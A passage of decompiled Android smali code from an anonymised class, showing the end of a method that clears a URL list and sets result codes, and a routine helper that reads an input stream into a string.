    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->clear()V

    .line 280
    const-string v8, ""

    .line 283
    .end local v2    # "flag":Z
    .end local v6    # "search":Ljava/lang/String;
    .end local v7    # "url":Ljava/lang/String;
    :cond_9
    :goto_1
    return-void

    .line 226
    .restart local v6    # "search":Ljava/lang/String;
    :catch_0
    move-exception v1

    .line 227
    .local v1, "e":Ljava/lang/InterruptedException;
    goto :goto_1

    .line 257
    .end local v1    # "e":Ljava/lang/InterruptedException;
    .restart local v2    # "flag":Z
    .restart local v7    # "url":Ljava/lang/String;
    :cond_a
    iget v8, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v8, v12, :cond_b

    .line 258
    iput v12, p0, Lcom/xxx/yyy/BBBB;->result:I

    goto/16 :goto_0

    .line 260
    :cond_b
    const/4 v8, 0x4

    iput v8, p0, Lcom/xxx/yyy/BBBB;->result:I

    goto/16 :goto_0
.end method

.method public generateString(Ljava/io/InputStream;)Ljava/lang/String;
    .locals 6
    .param p1, "stream"    # Ljava/io/InputStream;

    .prologue
    .line 62
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 63
    .local v3, "reader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 64
    .local v0, "buffer":Ljava/io/BufferedReader;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 67
    .local v4, "sb":Ljava/lang/StringBuilder;
    :goto_0
    :try_start_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .local v1, "cur":Ljava/lang/String;
    if-nez v1, :cond_0

    .line 76
    .end local v1    # "cur":Ljava/lang/String;
    :goto_1
    :try_start_1
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 81
    :goto_2
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    return-object v5

    .line 68
    .restart local v1    # "cur":Ljava/lang/String;
    :cond_0
    :try_start_2
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 71
    .end local v1    # "cur":Ljava/lang/String;
    :catch_0
    move-exception v5

    move-object v2, v5

    .line 73
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 77
    .end local v2    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v2

    .line 79
    .restart local v2    # "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method
